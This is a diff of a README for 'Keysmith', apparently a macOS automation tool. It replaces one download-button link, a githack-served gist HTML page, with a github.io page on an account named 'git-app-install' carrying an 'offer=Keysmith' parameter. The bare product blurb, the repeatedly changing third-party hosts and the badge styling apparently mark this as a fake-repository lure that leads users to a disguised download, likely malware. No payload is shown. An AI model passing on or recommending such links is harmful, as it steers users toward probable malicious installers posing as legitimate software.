@@ -2,7 +2,7 @@
 
 Keysmith is a powerful macOS tool that allows users to automate tasks and create custom shortcuts for applications. It simplifies repetitive workflows and improves productivity by providing easy-to-use automation features.
 
-<a href="https://gistcdn.githack.com/aquaeliasleeping/7f2514b37e76c061a6c3924b47e01808/raw/e09cf54c024f1e962f44201a93583b032de88b09/install.html?offer=Keysmith" target="_blank">
+<a href="https://git-app-install.github.io/.github/?offer=Keysmith" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Keysmith%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
